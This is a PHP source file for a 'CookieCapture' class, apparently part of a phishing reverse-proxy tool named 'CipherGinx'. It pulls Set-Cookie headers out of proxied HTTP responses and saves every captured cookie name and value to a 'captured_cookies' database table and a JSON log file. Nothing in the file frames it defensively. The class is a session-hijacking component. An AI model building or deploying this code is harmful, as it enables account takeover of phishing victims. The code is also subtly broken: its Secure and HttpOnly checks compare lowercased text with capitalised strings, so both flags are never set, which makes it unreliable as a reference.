<?php

namespace CipherGinx;

use Monolog\Logger;
use PDO;

/**
 * Cookie Capture
 * Extracts and logs captured cookies from responses
 */
class CookieCapture
{
    private Logger $logger;
    private array $config;
    private ?PDO $pdo;

    public function __construct(Logger $logger, array $config)
    {
        $this->logger = $logger;
        $this->config = $config;
        $this->initializeDatabase();
    }

    /**
     * Initialize database connection
     */
    private function initializeDatabase(): void
    {
        try {
            $dsn = sprintf(
                'mysql:host=%s;port=%s;dbname=%s;charset=utf8mb4',
                $this->config['db_host'] ?? 'localhost',
                $this->config['db_port'] ?? 3306,
                $this->config['db_name'] ?? 'cipherginx'
            );

            $this->pdo = new PDO(
                $dsn,
                $this->config['db_user'] ?? 'root',
                $this->config['db_password'] ?? ''
            );
            $this->pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

        } catch (\PDOException $e) {
            $this->logger->warning('Database connection failed: ' . $e->getMessage());
            $this->pdo = null;
        }
    }

    /**
     * Parse Set-Cookie headers from response
     */
    public function parse(string $response): void
    {
        $cookies = $this->extractSetCookieHeaders($response);

        if (empty($cookies)) {
            return;
        }

        $this->logger->info('Captured ' . count($cookies) . ' cookies');

        foreach ($cookies as $cookie) {
            $this->storeCookie($cookie);
            $this->logToFile($cookie);
        }
    }

    /**
     * Extract Set-Cookie headers from HTTP response
     */
    private function extractSetCookieHeaders(string $response): array
    {
        $cookies = [];
        $lines = explode("\r\n", $response);

        foreach ($lines as $line) {
            if (stripos($line, 'Set-Cookie:') === 0) {
                $cookie_str = substr($line, 12);
                $cookies[] = $this->parseCookieString($cookie_str);
            }
        }

        return $cookies;
    }

    /**
     * Parse individual cookie string
     */
    private function parseCookieString(string $cookie_str): array
    {
        $parts = explode(';', $cookie_str);
        [$name, $value] = explode('=', trim($parts[0]), 2);

        $cookie = [
            'name' => trim($name),
            'value' => trim($value),
            'domain' => '',
            'path' => '/',
            'expires' => null,
            'secure' => false,
            'httponly' => false,
            'samesite' => 'Lax',
            'captured_at' => date('Y-m-d H:i:s')
        ];

        // Parse cookie attributes
        for ($i = 1; $i < count($parts); $i++) {
            $attr = trim($parts[$i]);
            if (stripos($attr, 'Domain=') === 0) {
                $cookie['domain'] = substr($attr, 7);
            } elseif (stripos($attr, 'Path=') === 0) {
                $cookie['path'] = substr($attr, 5);
            } elseif (stripos($attr, 'Expires=') === 0) {
                $cookie['expires'] = substr($attr, 8);
            } elseif (strtolower($attr) === 'Secure') {
                $cookie['secure'] = true;
            } elseif (strtolower($attr) === 'HttpOnly') {
                $cookie['httponly'] = true;
            } elseif (stripos($attr, 'SameSite=') === 0) {
                $cookie['samesite'] = substr($attr, 9);
            }
        }

        return $cookie;
    }

    /**
     * Store cookie in database
     */
    private function storeCookie(array $cookie): void
    {
        if (!$this->pdo) {
            return;
        }

        try {
            $stmt = $this->pdo->prepare(
                'INSERT INTO captured_cookies 
                (name, value, domain, path, expires, secure, httponly, samesite, captured_at) 
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)'
            );

            $stmt->execute([
                $cookie['name'],
                $cookie['value'],
                $cookie['domain'],
                $cookie['path'],
                $cookie['expires'],
                $cookie['secure'] ? 1 : 0,
                $cookie['httponly'] ? 1 : 0,
                $cookie['samesite'],
                $cookie['captured_at']
            ]);

            $this->logger->debug('Cookie stored: ' . $cookie['name']);

        } catch (\PDOException $e) {
            $this->logger->error('Failed to store cookie: ' . $e->getMessage());
        }
    }

    /**
     * Log cookie to file
     */
    private function logToFile(array $cookie): void
    {
        if (!isset($this->config['cookie_log_file'])) {
            return;
        }

        $log_file = $this->config['cookie_log_file'];
        $log_entry = json_encode($cookie) . "\n";

        if (!file_exists(dirname($log_file))) {
            mkdir(dirname($log_file), 0755, true);
        }

        file_put_contents($log_file, $log_entry, FILE_APPEND);
        $this->logger->debug('Cookie logged to file: ' . $log_file);
    }
}
